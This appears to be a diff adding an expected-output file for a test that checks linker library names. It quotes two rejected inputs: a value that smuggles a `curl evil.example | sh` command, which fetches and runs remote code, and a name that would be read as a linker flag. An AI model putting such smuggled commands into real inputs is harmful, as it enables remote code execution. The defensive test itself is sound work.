@@ -1,0 +1,14 @@
+# Illegal twice: a `from library "NAME"` name goes on the linker's command
+# line, so it may only be letters, digits, '_', '.', '+' and '-', and may not
+# begin with '-'.
+#
+#   line 9    `m; curl evil.example | sh` is not a name the linker could look
+#             up (and used to be a shell command, when the link line was one
+#             string)
+#   line 13   `framework:-Wl,-rpath,/tmp` begins with '-' after the prefix,
+#             which the linker would read as a flag
+#
+# The header-form block on line 19 carries a slash and is NOT reported: it is
+# documentation and reaches no command line.
+9:1: is not a name the linker could look up
+13:1: begins with '-'
